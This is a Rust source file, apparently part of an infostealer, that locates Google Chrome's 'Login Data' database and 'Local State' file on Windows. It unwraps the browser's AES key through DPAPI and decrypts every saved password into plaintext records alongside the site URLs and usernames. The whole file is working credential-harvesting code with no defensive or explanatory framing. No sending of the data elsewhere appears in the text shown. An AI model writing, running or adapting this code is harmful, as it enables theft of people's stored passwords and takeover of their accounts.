
// SQLite Library
use rusqlite::{Connection, OpenFlags, NO_PARAMS};

// Standard Library
use std::{fs, ptr::{copy, null_mut}};

// WinAPI Wrapper Library
extern crate winapi;
use winapi::{shared::minwindef::{DWORD, HLOCAL},
um::dpapi::CryptUnprotectData,
um::winbase::LocalFree,
um::wincrypt::CRYPTOAPI_BLOB};

// JSON Library
use serde_json::Value;

// AES GCM Library
use aes_gcm::Aes256Gcm;
use aes_gcm::aead::{Aead, NewAead, generic_array::GenericArray};

pub struct ChromeData {
    pub cd_entries: Vec<ChromeDataEntry>,
    pub login_data_path: String,
    pub encryption_key: Vec<u8>,
    pub cd_errors: Vec<ChromeDataError>,
}

pub struct ChromeDataEntry {
    pub origin_url: String,
    pub action_url: String,
    pub username: String,
    pub password: String,
    pub date_c: i64,
    pub date_lu: i64,
}

pub struct ChromeDataError {
    pub error_id: u64,
    pub error_msg: String,
}

impl ChromeData {

    pub fn new() -> Self {
        ChromeData {
            cd_entries: Vec::<ChromeDataEntry>::new(),
            login_data_path: String::new(),
            encryption_key: Vec::<u8>::new(),
            cd_errors: Vec::<ChromeDataError>::new(),
        }
    }

    // Retrieve Chrome Login Data
    pub fn ret_chrome_logins(&mut self) -> i64 {
        
        if self.set_login_data_path() < 0 {
            return -1;
        }

        if self.get_aes_key() < 0 {
            return -2;
        }
        
        if self.cld_extract() < 0 {
            return -3;
        }

        0
    }

    // Set Login Data file path
    fn set_login_data_path(&mut self) -> i64 {

        let path_login_data = match platform_dirs::AppDirs::new(Some("Google\\Chrome\\User Data\\Default\\Login Data"), false) {
            Some(pls) => pls,
            None => {self.cd_errors.push(ChromeDataError{error_id: 1, error_msg: "Failed to get 'Login Data' path.".to_string()}); return -1}
        };
        let ld_path = match path_login_data.data_dir.as_path().to_str() {
            Some(s) => s,
            None => {self.cd_errors.push(ChromeDataError{error_id: 1, error_msg: "'Login Data' path is None".to_string()}); return -2}
        };
        self.login_data_path = ld_path.to_string();
        0
    }

    // Get AES Key from chrome 'Local State'
    fn get_aes_key(&mut self) -> i64 {

        // Parse key from json file and decode it (Base64)
        // Delete first 5 bytes (DPAPI string)
        // get decrypted AES key from CryptUnprotectData from DPAPI
        // return bytes of decrypted AES key

        let raw_json_data_path = match platform_dirs::AppDirs::new(Some("Google\\Chrome\\User Data\\Local State"), false) {
            Some(rjdp) => rjdp,
            None => {self.cd_errors.push(ChromeDataError{error_id: 7, error_msg: "Failed to 'Local State' path.".to_string()}); return -1}
        };

        let rjd_path = match raw_json_data_path.data_dir.as_path().to_str() {
            Some(s) => s,
            None => {self.cd_errors.push(ChromeDataError{error_id: 7, error_msg: "Failed to convert 'Local State' path to str.".to_string()}); return -2}
        };

        let raw_json_data = match fs::read(rjd_path) {
            Ok(bytes) => bytes,
            Err(_) => {self.cd_errors.push(ChromeDataError{error_id: 7, error_msg: "Failed to fs::read 'Local State' file.".to_string()}); return -3}
        };

        let json_string = match String::from_utf8(raw_json_data) {
            Ok(js) => js,
            Err(_) => {self.cd_errors.push(ChromeDataError{error_id: 7, error_msg: "Failed to convert 'Local State' bytes to UTF-8 string.".to_string()}); return -4}
        };

        let json_data_ser: Value = match serde_json::from_str(json_string.as_str()) {
            Ok(jds) => jds,
            Err(_) => {self.cd_errors.push(ChromeDataError{error_id: 7, error_msg: "Failed to deserialize json in 'Local State'".to_string()}); return -5}
        };
        
        let encrypted_key = json_data_ser["os_crypt"]["encrypted_key"].to_string().replace("\"", "");
        
        let mut encrypted_key_bytes = match base64::decode(encrypted_key) {
            Ok(ekb) => ekb,
            Err(_) => {self.cd_errors.push(ChromeDataError{error_id: 7, error_msg: "Failed to decode os_crypt{encrypted_key} value from 'Local State' json.".to_string()}); return -6}
        };

        let clean_encrypted_key_bytes: Vec<u8> = encrypted_key_bytes.drain(5..).collect();

        self.encryption_key = self.dpapi_decrypt(clean_encrypted_key_bytes);
        0
    }

    // Query SQLite DB / Extract data / Put data into ChromeDataEntry and fill ChromeData object
    fn cld_extract(&mut self) -> i64 {

        let db_conn = match Connection::open_with_flags(self.login_data_path.clone(), OpenFlags::SQLITE_OPEN_READ_ONLY) {
            Ok(conn) => conn,
            Err(_) => {self.cd_errors.push(ChromeDataError{error_id: 2, error_msg: "Could not connect to database.".to_string()}); return -1}
        };

        let mut stmt = match db_conn.prepare("SELECT origin_url, action_url, username_value, password_value, date_created, date_last_used FROM logins ORDER BY date_created") {
            Ok(r) => r,
            Err(_) => {self.cd_errors.push(ChromeDataError{error_id: 2, error_msg: "Database query statement preparation failed.".to_string()}); return -2}
        };

        let logins = match stmt.query_map(NO_PARAMS, |row| {

            let o_url = match row.get(0) {
                Ok(o) => o,
                Err(_) => {"cld_extract() Err: Row 0 failed.".to_string()}
            };

            let a_url = match row.get(1) {
                Ok(a) => a,
                Err(_) => {"cld_extract() Err: Row 1 extract failed.".to_string()}
            };

            let u_name = match row.get(2) {
                Ok(u) => u,
                Err(_) => {"cld_extract() Err: Row 2 extract failed.".to_string()}
            };

            let u_pw_bytes: Vec<u8> = match row.get(3) {
                Ok(p) => p,
                Err(_) => {"cld_extract() Err: Row 3 extract failed.".to_string().into_bytes()}
            };

            let date_created: i64 = match row.get(4) {
                Ok(dc) => dc,
                Err(_) => -1,
            };

            let date_last_used: i64 = match row.get(5) {
                Ok(dlu) => dlu,
                Err(_) => -2,
            };
            
            Ok(ChromeDataEntry{
                origin_url: o_url,
                action_url: a_url,
                username: u_name,
                password: self.decrypt_password(u_pw_bytes).to_string(),
                date_c: date_created,
                date_lu: date_last_used,
            })
        }){
            Ok(rows) => rows,
            Err(_) => {self.cd_errors.push(ChromeDataError{error_id: 2, error_msg: "Database query map failed.".to_string()}); return -3}
        };

        let mut chrome_entries = Vec::<ChromeDataEntry>::new();
        for login in logins {
            if let Ok(cde) = login {
                chrome_entries.push(cde);
            }
        }
        self.cd_entries = chrome_entries;

        return 0
    }

    
    // Decrypts bytes using DPAPI
    fn dpapi_decrypt(&mut self, mut enc: Vec<u8>) -> Vec<u8> {

        unsafe {
            let mut in_blob = CRYPTOAPI_BLOB {
                cbData: enc.len() as DWORD,
                pbData: enc.as_mut_ptr(),
            };
    
            let mut out_blob = CRYPTOAPI_BLOB {
                cbData: 0,
                pbData: null_mut(),
            };
    
            if CryptUnprotectData(&mut in_blob, null_mut(), null_mut(), null_mut(), null_mut(), 0, &mut out_blob) == 0 {
                self.cd_errors.push(ChromeDataError{error_id: 3, error_msg: "WinAPI call to CryptUnprotectData returned 0 (FALSE)".to_string()});
            }

            let out_blob_size = out_blob.cbData as usize;
            let mut buffer: Vec<u8> = Vec::with_capacity(out_blob_size);
            buffer.set_len(out_blob_size);
            copy(out_blob.pbData, buffer.as_mut_ptr(), out_blob_size);
    
            LocalFree(out_blob.pbData as HLOCAL);
            return buffer;
        }
    }

    // AES256GCM Decrypt
    fn decrypt_password(&mut self, mut enc_pass: Vec<u8>) -> String {

        let mut iv_dup = enc_pass.clone();
        let iv: Vec<u8> = iv_dup.drain(3..15).collect();
        let password_enc: Vec<u8> = enc_pass.drain(15..).collect();
        let key = GenericArray::from_slice(self.encryption_key.as_slice());
        let cipher = Aes256Gcm::new(key);
        let nonce = GenericArray::from_slice(iv.as_slice());
        let pw_pt = match cipher.decrypt(nonce, password_enc.as_ref()){
            Ok(pt) => pt,
            Err(_) => {self.cd_errors.push(ChromeDataError{error_id: 4, error_msg: "Failed to decrypt password.".to_string()}); return "decrypt_password() Err: Failed to decrypt password.".to_string()}
        };
        match String::from_utf8(pw_pt) {
            Ok(s) => s,
            Err(_) => {self.cd_errors.push(ChromeDataError{error_id: 4, error_msg: "Failed to parse password bytes to UTF-8.".to_string()}); return "decrypt_password() Err: Failed to parse password bytes to UTF-8.".to_string()}
        }
    }
}